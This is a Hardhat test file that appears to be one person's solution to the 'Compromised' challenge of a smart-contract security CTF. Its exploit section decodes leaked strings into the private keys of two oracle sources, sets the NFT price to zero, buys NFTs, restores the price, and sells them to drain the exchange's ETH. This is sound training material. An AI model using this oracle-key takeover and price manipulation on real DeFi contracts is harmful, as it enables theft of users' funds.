const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {
        /*
        I don't see anything in the contracts that specifically look exploitable
        The only way to buy an NFT seems to be to modify the median price in the transaction
        This means that we need to change the price on two of the sources for the oracle
        Coincidentally, the challenge webpage has two suspicious looking strings 🙃
        They must be linked to the source accounts somehow
         */
        // Strings from the challenge webpage with spaces removed
        const responseStrings = [
            "4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535",
            "4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134"
        ];
        // They look like hex strings, so start there
        const wallets = responseStrings.map((str) => {
            // Initial value looks like hex string
            const hexBuff = Buffer.from(str, 'hex');
            // Try something
            const decodedBuff = Buffer.from(hexBuff.toString(), 'base64');
            // Return decoded wallet
            return new ethers.Wallet(decodedBuff.toString(), ethers.provider);
        });
        // wallets.forEach((wallet) => console.log(wallet.address));
        // 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
        // 0x81A5D6E50C214044bE44cA0CB057fe119097850c
        // We have access to the last two sources
        // Initialize attacker contract
        const attackerContractFactory = await ethers.getContractFactory('ComprimisedAttacker', attacker);
        const attackerContract = await attackerContractFactory.deploy(this.exchange.address, this.nftToken.address);
        // Set the NFTs to 0 cost
        for(const wallet of wallets) {
            await this.oracle.connect(wallet).postPrice("DVNFT", 0);
            await wallet.sendTransaction({to: attackerContract.address, value: ethers.utils.parseEther('1.8')});
        }
        console.log("Price dropped");
        // Buy 10 NFTs
        await attackerContract.connect(attacker).buyUp(10);
        console.log("Bought");
        // Set the price back to initial price
        for(const wallet of wallets) {
            await this.oracle.connect(wallet).postPrice("DVNFT", INITIAL_NFT_PRICE);
        }
        console.log("Price raised");
        // Sell all the NFTs
        await attackerContract.connect(attacker).sellAll();
        console.log("Sold");
        await attackerContract.connect(attacker).withdraw();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
